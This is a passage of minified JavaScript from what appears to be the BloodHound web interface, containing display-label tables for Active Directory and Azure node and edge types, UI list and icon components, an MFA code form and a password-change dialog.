Services"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95",children:"Andy Robbins - Abusing Azure App Service Managed Identity Assignments"})]})},AZAddOwner:qt,AZAKSContributor:Ht,AZAutomationContributor:Xt,AZKeyVaultKVContributor:dr,AZLogicAppContributor:lr,AZNodeResourceGroup:Dr},$r=({text:e,search:t})=>{const n=(e=>e.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"))(t),o=new RegExp(`(.*?)(${n})(.*)`,"mi"),a=e.match(o);if(null===a||1===a.length)return h(u,{children:e});const i=a.slice(1);return h(A,{variant:"body2",component:"span",children:i.map(((e,n)=>e.toLowerCase()===t.toLowerCase()?h(A,{variant:"body2",component:"span",style:{fontWeight:"bold"},children:e},n):h(r.Fragment,{children:e},n)))})},Nr=Fe({icon:{position:"relative"},iconMedium:{borderRadius:0,height:"40px"},iconSmall:{borderRadius:0,padding:0},badge:e=>({position:"absolute",bottom:"3px",right:"3px",background:"#ae1dff",color:"#fff",width:"20px",height:"20px",lineHeight:e.overflow?"21px":"20px",fontSize:e.overflow?"10px":"12px",borderRadius:"10px"})}),Ur=Le((e=>({tooltip:{backgroundColor:e.palette.common.white,color:"rgba(0, 0, 0, 0.87)",boxShadow:e.shadows[1],fontSize:12,fontWeight:"normal"}})))(J),_r=({tip:e,tipPlacment:t="bottom",click:r,children:n,size:o,badge:a=0,className:i})=>{const s=a>99,c=s?"99+":a>0?a.toString():null,d=Nr({overflow:s});let l=o&&"small"===o?d.iconSmall:d.iconMedium;l+=` ${d.icon} ${i}`;const u=p(m,{className:`${l} icon`,onClick:r,size:"large",children:[n,c&&h(Lr,{text:c,overflow:s})]});return e?h(Ur,{title:e,placement:t,children:u}):u},Lr=({text:e,overflow:t=!1})=>{const r=Nr({overflow:t});return h("span",{className:r.badge,children:e})};var Wr,Fr,zr,Br,Vr,Kr,Hr,Zr,qr;function Yr(e){switch(e){case Wr.Entity:return"Entity";case Wr.User:return"User";case Wr.Computer:return"Computer";case Wr.Group:return"Group";case Wr.GPO:return"GPO";case Wr.OU:return"OU";case Wr.Container:return"Container";case Wr.Domain:return"Domain";case Wr.LocalGroup:return"LocalGroup";case Wr.LocalUser:return"LocalUser";default:return}}function Jr(e){switch(e){case Fr.Owns:return"Owns";case Fr.GenericAll:return"GenericAll";case Fr.GenericWrite:return"GenericWrite";case Fr.WriteOwner:return"WriteOwner";case Fr.WriteDACL:return"WriteDACL";case Fr.MemberOf:return"MemberOf";case Fr.ForceChangePassword:return"ForceChangePassword";case Fr.AllExtendedRights:return"AllExtendedRights";case Fr.AddMember:return"AddMember";case Fr.HasSession:return"HasSession";case Fr.Contains:return"Contains";case Fr.GPLink:return"GPLink";case Fr.AllowedToDelegate:return"AllowedToDelegate";case Fr.GetChanges:return"GetChanges";case Fr.GetChangesAll:return"GetChangesAll";case Fr.GetChangesInFilteredSet:return"GetChangesInFilteredSet";case Fr.TrustedBy:return"TrustedBy";case Fr.AllowedToAct:return"AllowedToAct";case Fr.AdminTo:return"AdminTo";case Fr.CanPSRemote:return"CanPSRemote";case Fr.CanRDP:return"CanRDP";case Fr.ExecuteDCOM:return"ExecuteDCOM";case Fr.HasSIDHistory:return"HasSIDHistory";case Fr.AddSelf:return"AddSelf";case Fr.DCSync:return"DCSync";case Fr.ReadLAPSPassword:return"ReadLAPSPassword";case Fr.ReadGMSAPassword:return"ReadGMSAPassword";case Fr.DumpSMSAPassword:return"DumpSMSAPassword";case Fr.SQLAdmin:return"SQLAdmin";case Fr.AddAllowedToAct:return"AddAllowedToAct";case Fr.WriteSPN:return"WriteSPN";case Fr.AddKeyCredentialLink:return"AddKeyCredentialLink";case Fr.LocalToComputer:return"LocalToComputer";case Fr.MemberOfLocalGroup:return"MemberOfLocalGroup";case Fr.RemoteInteractiveLogonPrivilege:return"RemoteInteractiveLogonPrivilege";case Fr.SyncLAPSPassword:return"SyncLAPSPassword";case Fr.WriteAccountRestrictions:return"WriteAccountRestrictions";default:return}}function Xr(e){switch(e){case zr.AdminCount:return"Admin Count";case zr.DistinguishedName:return"Distinguished Name";case zr.DomainFQDN:return"Domain FQDN";case zr.DomainSID:return"Domain SID";case zr.Sensitive:return"Marked sensitive";case zr.HighValue:return"High Value";case zr.BlocksInheritance:return"Blocks Inheritance";case zr.IsACL:return"Is ACL";case zr.IsACLProtected:return"ACL Inheritance Denied";case zr.Enforced:return"Enforced";case zr.Department:return"Department";case zr.HasSPN:return"Has SPN";case zr.UnconstrainedDelegation:return"Allows Unconstrained Delegation";case zr.LastLogon:return"Last Logon";case zr.LastLogonTimestamp:return"Last Logon (Replicated)";case zr.IsPrimaryGroup:return"Is Primary Group";case zr.HasLAPS:return"LAPS Enabled";case zr.DontRequirePreAuth:return"Do Not Require Pre-Authentication";case zr.LogonType:return"Logon Type";case zr.HasURA:return"Has User Rights Assignment Collection";case zr.PasswordNeverExpires:return"Password Never Expires";case zr.PasswordNotRequired:return"Password Not Required";case zr.FunctionalLevel:return"Functional Level";case zr.TrustType:return"Trust Type";case zr.SidFiltering:return"SID Filtering Enabled";case zr.TrustedToAuth:return"Trusted For Constrained Delegation";case zr.SamAccountName:return"SAM Account Name";default:return}}function Qr(){return[Fr.Owns,Fr.GenericAll,Fr.GenericWrite,Fr.WriteOwner,Fr.WriteDACL,Fr.MemberOf,Fr.ForceChangePassword,Fr.AllExtendedRights,Fr.AddMember,Fr.HasSession,Fr.Contains,Fr.GPLink,Fr.AllowedToDelegate,Fr.TrustedBy,Fr.AllowedToAct,Fr.AdminTo,Fr.CanPSRemote,Fr.CanRDP,Fr.ExecuteDCOM,Fr.HasSIDHistory,Fr.AddSelf,Fr.DCSync,Fr.ReadLAPSPassword,Fr.ReadGMSAPassword,Fr.DumpSMSAPassword,Fr.SQLAdmin,Fr.AddAllowedToAct,Fr.WriteSPN,Fr.AddKeyCredentialLink,Fr.SyncLAPSPassword,Fr.WriteAccountRestrictions]}function en(e){switch(e){case Br.Entity:return"Entity";case Br.VMScaleSet:return"VMScaleSet";case Br.App:return"App";case Br.Role:return"Role";case Br.Device:return"Device";case Br.FunctionApp:return"FunctionApp";case Br.Group:return"Group";case Br.KeyVault:return"KeyVault";case Br.ManagementGroup:return"ManagementGroup";case Br.ResourceGroup:return"ResourceGroup";case Br.ServicePrincipal:return"ServicePrincipal";case Br.Subscription:return"Subscription";case Br.Tenant:return"Tenant";case Br.User:return"User";case Br.VM:return"VM";case Br.ManagedCluster:return"ManagedCluster";case Br.ContainerRegistry:return"ContainerRegistry";case Br.WebApp:return"WebApp";case Br.LogicApp:return"LogicApp";case Br.AutomationAccount:return"AutomationAccount";default:return}}function tn(e){switch(e){case Vr.AvereContributor:return"AvereContributor";case Vr.Contains:return"Contains";case Vr.Contributor:return"Contributor";case Vr.GetCertificates:return"GetCertificates";case Vr.GetKeys:return"GetKeys";case Vr.GetSecrets:return"GetSecrets";case Vr.HasRole:return"HasRole";case Vr.MemberOf:return"MemberOf";case Vr.Owner:return"Owner";case Vr.RunsAs:return"RunsAs";case Vr.VMContributor:return"VMContributor";case Vr.AutomationContributor:return"AutomationContributor";case Vr.KeyVaultContributor:return"KeyVaultContributor";case Vr.VMAdminLogin:return"VMAdminLogin";case Vr.AddMembers:return"AddMembers";case Vr.AddSecret:return"AddSecret";case Vr.ExecuteCommand:return"ExecuteCommand";case Vr.GlobalAdmin:return"GlobalAdmin";case Vr.PrivilegedAuthAdmin:return"PrivilegedAuthAdmin";case Vr.Grant:return"Grant";case Vr.GrantSelf:return"GrantSelf";case Vr.PrivilegedRoleAdmin:return"PrivilegedRoleAdmin";case Vr.ResetPassword:return"ResetPassword";case Vr.UserAccessAdministrator:return"UserAccessAdministrator";case Vr.Owns:return"Owns";case Vr.ScopedTo:return"ScopedTo";case Vr.CloudAppAdmin:return"CloudAppAdmin";case Vr.AppAdmin:return"AppAdmin";case Vr.AddOwner:return"AddOwner";case Vr.ManagedIdentity:return"ManagedIdentity";case Vr.ApplicationReadWriteAll:return"ApplicationReadWriteAll";case Vr.AppRoleAssignmentReadWriteAll:return"AppRoleAssignmentReadWriteAll";case Vr.DirectoryReadWriteAll:return"DirectoryReadWriteAll";case Vr.GroupReadWriteAll:return"GroupReadWriteAll";case Vr.GroupMemberReadWriteAll:return"GroupMemberReadWriteAll";case Vr.RoleManagementReadWriteDirectory:return"RoleManagementReadWriteDirectory";case Vr.ServicePrincipalEndpointReadWriteAll:return"ServicePrincipalEndpointReadWriteAll";case Vr.AKSContributor:return"AKSContributor";case Vr.NodeResourceGroup:return"NodeResourceGroup";case Vr.WebsiteContributor:return"WebsiteContributor";case Vr.LogicAppContributor:return"LogicAppContributor";case Vr.AZMGAddMember:return"AZMGAddMember";case Vr.AZMGAddOwner:return"AZMGAddOwner";case Vr.AZMGAddSecret:return"AZMGAddSecret";case Vr.AZMGGrantAppRoles:return"AZMGGrantAppRoles";case Vr.AZMGGrantRole:return"AZMGGrantRole";default:return}}function rn(e){switch(e){case Kr.AppOwnerOrganizationID:return"App Owner Organization ID";case Kr.AppDescription:return"App Description";case Kr.AppDisplayName:return"App Display Name";case Kr.ServicePrincipalType:return"Service Principal Type";case Kr.UserType:return"User Type";case Kr.TenantID:return"Tenant ID";case Kr.ServicePrincipalID:return"Service Principal ID";case Kr.ServicePrincipalNames:return"Service Principal Names";case Kr.OperatingSystemVersion:return"Operating System Version";case Kr.TrustType:return"Trust Type";case Kr.IsBuiltIn:return"Is Built In";case Kr.AppID:return"App ID";case Kr.AppRoleID:return"App Role ID";case Kr.DeviceID:return"Device ID";case Kr.NodeResourceGroupID:return"Node Resource Group ID";case Kr.OnPremID:return"On Prem ID";case Kr.OnPremSyncEnabled:return"On Prem Sync Enabled";case Kr.SecurityEnabled:return"Security Enabled";case Kr.SecurityIdentifier:return"Security Identifier";case Kr.EnableRBACAuthorization:return"RBAC Authorization Enabled";case Kr.Scope:return"Scope";case Kr.Offer:return"Offer";case Kr.MFAEnabled:return"MFA Enabled";case Kr.License:return"License";case Kr.Licenses:return"Licenses";case Kr.MFAEnforced:return"MFA Enforced";case Kr.UserPrincipalName:return"User Principal Name";case Kr.IsAssignableToRole:return"Is Role Assignable";case Kr.PublisherDomain:return"Publisher Domain";case Kr.SignInAudience:return"Sign In Audience";case Kr.RoleTemplateID:return"Role Template ID";default:return}}function nn(){return[Vr.AvereContributor,Vr.Contains,Vr.Contributor,Vr.GetCertificates,Vr.GetKeys,Vr.GetSecrets,Vr.HasRole,Vr.MemberOf,Vr.Owner,Vr.RunsAs,Vr.VMContributor,Vr.AutomationContributor,Vr.KeyVaultContributor,Vr.VMAdminLogin,Vr.AddMembers,Vr.AddSecret,Vr.ExecuteCommand,Vr.GlobalAdmin,Vr.PrivilegedAuthAdmin,Vr.Grant,Vr.GrantSelf,Vr.PrivilegedRoleAdmin,Vr.ResetPassword,Vr.UserAccessAdministrator,Vr.Owns,Vr.CloudAppAdmin,Vr.AppAdmin,Vr.AddOwner,Vr.ManagedIdentity,Vr.AKSContributor,Vr.NodeResourceGroup,Vr.WebsiteContributor,Vr.LogicAppContributor,Vr.AZMGAddMember,Vr.AZMGAddOwner,Vr.AZMGAddSecret,Vr.AZMGGrantAppRoles,Vr.AZMGGrantRole]}function on(e){if(e===Hr.MigrationData)return"MigrationData"}function an(e){switch(e){case Zr.ObjectID:return"Object ID";case Zr.Name:return"Name";case Zr.DisplayName:return"Display Name";case Zr.Description:return"Description";case Zr.OwnerObjectID:return"Owner Object ID";case Zr.Collected:return"Collected";case Zr.OperatingSystem:return"Operating System";case Zr.SystemTags:return"Node System Tags";case Zr.UserTags:return"Node User Tags";case Zr.LastSeen:return"Last Collected by BloodHound";case Zr.WhenCreated:return"Created";case Zr.Enabled:return"Enabled";case Zr.PasswordLastSet:return"Password Last Set";case Zr.Title:return"Title";case Zr.Email:return"Email";case Zr.IsInherited:return"Is Inherited";default:return}}!function(e){e.Entity="Base",e.User="User",e.Computer="Computer",e.Group="Group",e.GPO="GPO",e.OU="OU",e.Container="Container",e.Domain="Domain",e.LocalGroup="ADLocalGroup",e.LocalUser="ADLocalUser"}(Wr||(Wr={})),function(e){e.Owns="Owns",e.GenericAll="GenericAll",e.GenericWrite="GenericWrite",e.WriteOwner="WriteOwner",e.WriteDACL="WriteDacl",e.MemberOf="MemberOf",e.ForceChangePassword="ForceChangePassword",e.AllExtendedRights="AllExtendedRights",e.AddMember="AddMember",e.HasSession="HasSession",e.Contains="Contains",e.GPLink="GPLink",e.AllowedToDelegate="AllowedToDelegate",e.GetChanges="GetChanges",e.GetChangesAll="GetChangesAll",e.GetChangesInFilteredSet="GetChangesInFilteredSet",e.TrustedBy="TrustedBy",e.AllowedToAct="AllowedToAct",e.AdminTo="AdminTo",e.CanPSRemote="CanPSRemote",e.CanRDP="CanRDP",e.ExecuteDCOM="ExecuteDCOM",e.HasSIDHistory="HasSIDHistory",e.AddSelf="AddSelf",e.DCSync="DCSync",e.ReadLAPSPassword="ReadLAPSPassword",e.ReadGMSAPassword="ReadGMSAPassword",e.DumpSMSAPassword="DumpSMSAPassword",e.SQLAdmin="SQLAdmin",e.AddAllowedToAct="AddAllowedToAct",e.WriteSPN="WriteSPN",e.AddKeyCredentialLink="AddKeyCredentialLink",e.LocalToComputer="LocalToComputer",e.MemberOfLocalGroup="MemberOfLocalGroup",e.RemoteInteractiveLogonPrivilege="RemoteInteractiveLogonPrivilege",e.SyncLAPSPassword="SyncLAPSPassword",e.WriteAccountRestrictions="WriteAccountRestrictions"}(Fr||(Fr={})),function(e){e.AdminCount="admincount",e.DistinguishedName="distinguishedname",e.DomainFQDN="domain",e.DomainSID="domainsid",e.Sensitive="sensitive",e.HighValue="highvalue",e.BlocksInheritance="blocksinheritance",e.IsACL="isacl",e.IsACLProtected="isaclprotected",e.Enforced="enforced",e.Department="department",e.HasSPN="hasspn",e.UnconstrainedDelegation="unconstraineddelegation",e.LastLogon="lastlogon",e.LastLogonTimestamp="lastlogontimestamp",e.IsPrimaryGroup="isprimarygroup",e.HasLAPS="haslaps",e.DontRequirePreAuth="dontreqpreauth",e.LogonType="logontype",e.HasURA="hasura",e.PasswordNeverExpires="pwdneverexpires",e.PasswordNotRequired="passwordnotreqd",e.FunctionalLevel="functionallevel",e.TrustType="trusttype",e.SidFiltering="sidfiltering",e.TrustedToAuth="trustedtoauth",e.SamAccountName="samaccountname"}(zr||(zr={})),function(e){e.Entity="AZBase",e.VMScaleSet="AZVMScaleSet",e.App="AZApp",e.Role="AZRole",e.Device="AZDevice",e.FunctionApp="AZFunctionApp",e.Group="AZGroup",e.KeyVault="AZKeyVault",e.ManagementGroup="AZManagementGroup",e.ResourceGroup="AZResourceGroup",e.ServicePrincipal="AZServicePrincipal",e.Subscription="AZSubscription",e.Tenant="AZTenant",e.User="AZUser",e.VM="AZVM",e.ManagedCluster="AZManagedCluster",e.ContainerRegistry="AZContainerRegistry",e.WebApp="AZWebApp",e.LogicApp="AZLogicApp",e.AutomationAccount="AZAutomationAccount"}(Br||(Br={})),function(e){e.AvereContributor="AZAvereContributor",e.Contains="AZContains",e.Contributor="AZContributor",e.GetCertificates="AZGetCertificates",e.GetKeys="AZGetKeys",e.GetSecrets="AZGetSecrets",e.HasRole="AZHasRole",e.MemberOf="AZMemberOf",e.Owner="AZOwner",e.RunsAs="AZRunsAs",e.VMContributor="AZVMContributor",e.AutomationContributor="AZAutomationContributor",e.KeyVaultContributor="AZKeyVaultContributor",e.VMAdminLogin="AZVMAdminLogin",e.AddMembers="AZAddMembers",e.AddSecret="AZAddSecret",e.ExecuteCommand="AZExecuteCommand",e.GlobalAdmin="AZGlobalAdmin",e.PrivilegedAuthAdmin="AZPrivilegedAuthAdmin",e.Grant="AZGrant",e.GrantSelf="AZGrantSelf",e.PrivilegedRoleAdmin="AZPrivilegedRoleAdmin",e.ResetPassword="AZResetPassword",e.UserAccessAdministrator="AZUserAccessAdministrator",e.Owns="AZOwns",e.ScopedTo="AZScopedTo",e.CloudAppAdmin="AZCloudAppAdmin",e.AppAdmin="AZAppAdmin",e.AddOwner="AZAddOwner",e.ManagedIdentity="AZManagedIdentity",e.ApplicationReadWriteAll="AZMGApplication_ReadWrite_All",e.AppRoleAssignmentReadWriteAll="AZMGAppRoleAssignment_ReadWrite_All",e.DirectoryReadWriteAll="AZMGDirectory_ReadWrite_All",e.GroupReadWriteAll="AZMGGroup_ReadWrite_All",e.GroupMemberReadWriteAll="AZMGGroupMember_ReadWrite_All",e.RoleManagementReadWriteDirectory="AZMGRoleManagement_ReadWrite_Directory",e.ServicePrincipalEndpointReadWriteAll="AZMGServicePrincipalEndpoint_ReadWrite_All",e.AKSContributor="AZAKSContributor",e.NodeResourceGroup="AZNodeResourceGroup",e.WebsiteContributor="AZWebsiteContributor",e.LogicAppContributor="AZLogicAppContributor",e.AZMGAddMember="AZMGAddMember",e.AZMGAddOwner="AZMGAddOwner",e.AZMGAddSecret="AZMGAddSecret",e.AZMGGrantAppRoles="AZMGGrantAppRoles",e.AZMGGrantRole="AZMGGrantRole"}(Vr||(Vr={})),function(e){e.AppOwnerOrganizationID="appownerorganizationid",e.AppDescription="appdescription",e.AppDisplayName="appdisplayname",e.ServicePrincipalType="serviceprincipaltype",e.UserType="usertype",e.TenantID="tenantid",e.ServicePrincipalID="service_principal_id",e.ServicePrincipalNames="service_principal_names",e.OperatingSystemVersion="operatingsystemversion",e.TrustType="trustype",e.IsBuiltIn="isbuiltin",e.AppID="appid",e.AppRoleID="approleid",e.DeviceID="deviceid",e.NodeResourceGroupID="noderesourcegroupid",e.OnPremID="onpremid",e.OnPremSyncEnabled="onpremsyncenabled",e.SecurityEnabled="securityenabled",e.SecurityIdentifier="securityidentifier",e.EnableRBACAuthorization="enablerbacauthorization",e.Scope="scope",e.Offer="offer",e.MFAEnabled="mfaenabled",e.License="license",e.Licenses="licenses",e.MFAEnforced="mfaenforced",e.UserPrincipalName="userprincipalname",e.IsAssignableToRole="isassignabletorole",e.PublisherDomain="publisherdomain",e.SignInAudience="signinaudience",e.RoleTemplateID="templateid"}(Kr||(Kr={})),function(e){e.MigrationData="MigrationData"}(Hr||(Hr={})),function(e){e.ObjectID="objectid",e.Name="name",e.DisplayName="displayname",e.Description="description",e.OwnerObjectID="owner_objectid",e.Collected="collected",e.OperatingSystem="operatingsystem",e.SystemTags="system_tags",e.UserTags="user_tags",e.LastSeen="lastseen",e.WhenCreated="whencreated",e.Enabled="enabled",e.PasswordLastSet="pwdlastset",e.Title="title",e.Email="email",e.IsInherited="isinherited"}(Zr||(Zr={})),function(e){e[e.TIER_ZERO=0]="TIER_ZERO",e[e.EXPAND=1]="EXPAND",e[e.COLLAPSE=2]="COLLAPSE"}(qr||(qr={}));const sn={[Wr.User]:{icon:he,color:"#17E625"},[Wr.Group]:{icon:pe,color:"#DBE617"},[Wr.Computer]:{icon:ue,color:"#E67873"},[Wr.Domain]:{icon:me,color:"#17E6B9"},[Wr.GPO]:{icon:be,color:"#998EFD"},[Wr.OU]:{icon:ye,color:"#FFAA00"},[Wr.Container]:{icon:ge,color:"#F79A78"},[Br.User]:{icon:he,color:"#34D2EB"},[Br.Group]:{icon:pe,color:"#F57C9B"},[Br.Tenant]:{icon:we,color:"#54F2F2"},[Br.Subscription]:{icon:fe,color:"#D2CCA1"},[Br.ResourceGroup]:{icon:ve,color:"#89BD9E"},[Br.VM]:{icon:ue,color:"#F9ADA0"},[Br.WebApp]:{icon:Ae,color:"#4696E9"},[Br.LogicApp]:{icon:ye,color:"#9EE047"},[Br.AutomationAccount]:{icon:Se,color:"#F4BA44"},[Br.FunctionApp]:{icon:Te,color:"#F4BA44"},[Br.ContainerRegistry]:{icon:ke,color:"#0885D7"},[Br.ManagedCluster]:{icon:Ce,color:"#326CE5"},[Br.Device]:{icon:ue,color:"#B18FCF"},[Br.KeyVault]:{icon:Pe,color:"#ED658C"},[Br.App]:{icon:De,color:"#03FC84"},[Br.VMScaleSet]:{icon:Re,color:"#007CD0"},[Br.ServicePrincipal]:{icon:Oe,color:"#C1D6D6"},[Br.Role]:{icon:Me,color:"#ED8537"},[Br.ManagementGroup]:{icon:ye,color:"#BD93D8"}},cn={[qr.TIER_ZERO]:{icon:Ie,color:"#000000",iconColor:"#FFFFFF"},[qr.EXPAND]:{icon:xe,color:"#FFFFFF",iconColor:"#000000"},[qr.COLLAPSE]:{icon:Ge,color:"#FFFFFF",iconColor:"#000000"}},dn={icon:je,color:"#FFFFFF"},ln=Fe({root:{display:"inline-block",marginRight:"4px",position:"relative"},container:{backgroundColor:e=>sn[e.nodeType]?.color||"#FFFFFF",border:"1px solid #000000",padding:"2px",borderRadius:"50%",height:"22px",width:"22px",display:"flex",alignItems:"center",justifyContent:"center",fontSize:"14px",color:"#000000DD"}}),hn=({nodeType:e})=>{const t=ln({nodeType:e});return h(J,{title:e||"",describeChild:!0,children:h(v,{className:t.root,children:h(v,{className:t.container,children:h(oe,{icon:sn[e]?.icon||je,transform:"shrink-2"})})})})},pn=({style:e,...t})=>h(Z,{component:"ul","data-testid":"infinite-scroll-table",disablePadding:!0,style:{...e,overflowX:"hidden"},...t}),un=ze(((e,t)=>({items:e,onClick:t}))),mn=l((({data:e,index:t,style:r})=>{const{items:n,onClick:o}=e,a=n[t],i=t%2?"odd-item":"even-item";if(void 0===a)return h(q,{className:i,style:{...r,whiteSpace:"nowrap",padding:"0 8px"},"data-testid":"entity-row",children:h(W,{variant:"text",width:"100%"})});const s={id:a.objectID||a.props?.objectid||"",name:a.name||a.objectID||a.props?.name||a.props?.objectid||"Unknown",type:a.label||a.kind||""};return p(q,{button:!0,className:i,onClick:()=>{o(s)},style:{...r,padding:"0 8px"},"data-testid":"entity-row",children:[h(hn,{nodeType:s.type}),h(J,{title:s.name,children:h("div",{style:{minWidth:"0",whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis"},children:s.name})})]})}),Be),bn=({fetchDataCallback:e,itemCount:t=1e3,onClick:r=(()=>{})})=>{const[n,o]=s(!1),[a,i]=s({}),c=un(a,r);return h(Ke,{threshold:32,minimumBatchSize:128,isItemLoaded:e=>!!a[e],itemCount:t,loadMoreItems:async(t,r)=>{if(n)return;o(!0);const s=r-t+1;return e({skip:t,limit:s}).then((e=>{const r={};for(let n=0;n<s;n++)r[n+t]=e.data[n];i(Object.assign({},a,r))})).finally((()=>{o(!1)}))},children:({onItemsRendered:e,ref:r})=>h(Ve,{height:32*Math.min(t,16),itemCount:t,itemData:c,itemSize:32,onItemsRendered:e,innerElementType:pn,ref:r,width:"100%",initialScrollOffset:0,style:{borderRadius:4},children:mn})})},yn=({loading:e})=>e?h(v,{position:"absolute",top:"0",left:"0",right:"0",bottom:"0",bgcolor:"rgba(0, 0, 0, 0.2)",display:"flex",alignItems:"center",justifyContent:"center",zIndex:1e3,children:h(X,{color:"primary"})}):null,gn=Fe((e=>({container:{display:"flex",flexDirection:"row",alignItems:"center",borderBottom:"3px solid transparent",cursor:"pointer",marginRight:e.spacing(4),whiteSpace:"nowrap","&:hover":{borderBottom:"3px solid #a7adb0"},"& svg":{color:"#a7adb0"}},icon:{marginRight:e.spacing(1)},title:{textTransform:"uppercase",fontSize:"0.875rem",lineHeight:1.5,fontWeight:500,letterSpacing:"0.0075em"},active:{color:"#406f8e",borderBottom:"3px solid #6798B9","&:hover":{borderBottom:"3px solid #6798B9"},"& svg":{color:"#6798B9"}}}))),wn=({title:e,active:t,icon:r,onClick:n,...o})=>{const a=gn();return p("div",{className:He(a.container,t?a.active:null),onClick:n,...o,children:[r&&h(v,{className:a.icon,children:r}),h(v,{className:He(a.title,"noselect"),children:e})]})},fn=({dataCollectionLink:e,fileIngestLink:t})=>{const r=k();return h(v,{display:"flex",justifyContent:"center",mt:r.spacing(8),mx:r.spacing(4),children:p(j,{severity:"info",children:[h(V,{children:"No Data Available"}),"It appears that no data has been uploaded yet.",h("br",{}),"See our ",e," documentation to learn how to start collecting data.",h("br",{}),t&&p(u,{children:["If you have files available from a SharpHound or AzureHound collection, please visit the"," ",t," page to begin uploading your data."]})]})})},vn=({onSubmit:e,onCancel:t,loading:r=!1})=>{const[n,o]=s("");return h("form",{onSubmit:t=>{t.preventDefault(),e(n)},children:p(x,{container:!0,spacing:4,justifyContent:"center",children:[p(x,{item:!0,xs:12,children:[h(A,{variant:"body1",children:h("strong",{children:"Multi-Factor Authentication Enabled"})}),h(A,{variant:"body1",children:"Provide the 6 digit code from your authenticator app."})]}),h(x,{item:!0,xs:12,children:h(G,{id:"otp",name:"otp",label:"6-Digit Code",type:"text",fullWidth:!0,variant:"outlined",value:n,onChange:e=>o(e.target.value),autoFocus:!0})}),p(x,{item:!0,xs:8,children:[h(T,{variant:"contained",color:"primary",size:"large",type:"submit",fullWidth:!0,disableElevation:!0,disabled:r,children:r?"Checking Code":"Check Code"}),h(v,{mt:2,children:h(T,{onClick:t,color:"inherit",variant:"contained",size:"large",type:"button",fullWidth:!0,disableElevation:!0,disabled:r,children:"Return to Login"})})]})]})})},An=({title:e,children:t,...r})=>h(B,{maxWidth:"xl",...r,children:p(v,{py:2,children:[e&&h(v,{mb:2,children:h(A,{variant:"h1",children:e})}),t]})}),Sn=new Ze({baseURL:window.location.origin}),Tn=({data:e,fileName:t,fileType:r})=>{const n=new Blob([e],{type:r}),o=document.createElement("a");o.download=t,o.href=window.URL.createObjectURL(n);const a=new MouseEvent("click",{view:window,bubbles:!0,cancelable:!0});o.dispatchEvent(a),o.remove()},kn=(e,t)=>{e.preventDefault(),Tn({data:JSON.stringify(t),fileName:"bh-graph.json",fileType:"text/json"})};var Cn;!function(e){e.WHEN_CREATED="whencreated",e.LAST_LOGON="lastlogon",e.LAST_LOGON_TIMESTAMP="lastlogontimestamp",e.PASSWORD_LAST_SET="pwdlastset"}(Cn||(Cn={}));const Pn=(e,t)=>{const r="UNKNOWN",n="NEVER";switch(t){case Cn.WHEN_CREATED:return 0===e||-1===e?r:We.fromSeconds(e).toFormat($t.DATETIME);case Cn.LAST_LOGON:case Cn.LAST_LOGON_TIMESTAMP:return 0===e?r:-1===e?n:We.fromSeconds(e).toFormat($t.DATETIME);case Cn.PASSWORD_LAST_SET:return 0===e?"ACCOUNT CREATED BUT NO PASSWORD SET":-1===e?n:We.fromSeconds(e).toFormat($t.DATETIME);default:return""}},Dn=(e,t,r)=>{if("ad"===t&&Object.values(Cn).includes(r))return Pn(e,r);const n=Math.round((new Date).getTime()/1e3);if(e>315536400&&e<n)return We.fromSeconds(e).toFormat($t.DATETIME);if(e>0&&e<1){return`${(100*e).toFixed(0)}%`}return`${e}`.toLocaleString()},Rn=e=>e.toString().toUpperCase(),On=(e,t)=>{const r=We.fromISO(e);return null===r.invalid&&"functionallevel"!==t?r.toFormat($t.DATETIME):e},Mn=(e,t,r)=>{switch(typeof e){case"number":return Dn(e,t,r);case"boolean":return Rn(e);default:return On(e,r)}},In=e=>{const t=e.value,r=[];return t.forEach((t=>{r.push(Mn(t,e.kind,e.keyprop))})),r},xn=e=>{const{value:t,kind:r,keyprop:n}=e;return Array.isArray(t)?In(e):Mn(t,r,n)},Gn=new RegExp("^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[^\\w\\s])(?=.{12,})","u"),jn=e=>Gn.test(e),En=["must have at least 12 characters","must have at least one lowercase","must have at least one uppercase","must have at least one number","must have at least one of (!@#$%^&*)"],$n=e=>e?.first_name&&e?.last_name?`${e.first_name} ${e.last_name}`:e?.first_name?e.first_name:e?.principal_name?e.principal_name:void 0,Nn=En.map(((e,t)=>h("li",{children:e},t))),Un=({open:e,userId:t,onClose:n,showNeedsPasswordReset:o=!1,onSave:a})=>{const{control:i,handleSubmit:s,getValues:c,formState:{errors:d},reset:l}=Ue({defaultValues:{password:"",confirmPassword:"",needsPasswordReset:!1}});r.useEffect((()=>{e&&l()}),[e,l]);return p(C,{open:e,fullWidth:!0,maxWidth:"xs",onClose:(e,t)=>{"backdropClick"!==t&&"escapeKeyDown"!==t&&n()},PaperProps:{"data-testid":"password-dialog"},children:[h(P,{children:"Change Password"}),p("form",{autoComplete:"off",onSubmit:s((e=>a({userId:t,secret:e.password,needsPasswordReset:Boolean(e.needsPasswordReset)}))),children:[h(D,{children:p(x,{container:!0,spacing:2,children:[!!d.password&&h(x,{item:!0,xs:12,children:p(j,{severity:"error",children:[h(V,{children:"Password Requirements"}),h("ul",{children:Nn})]})}),h(x,{item:!0,xs:12,children:h(_e,{name:"password",control:i,rules:{required:"Password is required",pattern:Gn},render:({field:e})=>h(G,{...e,variant:"standard",id:"password",label:"Password",type:"password",fullWidth:!0,error:!!d.password,"data-testid":"password-dialog_input-password"})})}),h(x,{item:!0,xs:12,children:h(_e,{name:"confirmPassword",control:i,rules:{required:"Confirmation password is required",validate:e=>c("password")===e||"Password does not match"},render:({field:e})=>h(G,{...e,variant:"standard",id:"confirmPassword",label:"Confirmation Password",type:"password",fullWidth:!0,error:!!d.confirmPassword,helperText:d.confirmPassword?.message,"data-testid":"password-dialog_input-password-confirmation"})})}),o&&h(x,{item:!0,xs:12,children:h(_e,{name:"needsPasswordReset",control:i,render:({field:e})=>h(g,{control:h(w,{...e,onChange:t=>e.onChange(t.target.checked),color:"primary","data-testid":"password-dialog_checkbox-needs-password-reset"}),label:"Force Password Reset?"})})})]})}),p(O,{children:[h(T,{autoFocus:!0,color:"inherit",onClick:n,"data-testid":"password-dialog_button-close",children:"Cancel"}),h(T,{autoFocus:!1,color:"primary",type:"submit","data-testid":"password-dialog_button-save",children:"Save"})]})]})]})},_n=({listSections:e,clickHandler:t,deleteHandler:r})=>{const[n,o]=s(!1),[a,i]=s(),c=()=>{o(!1),i(void 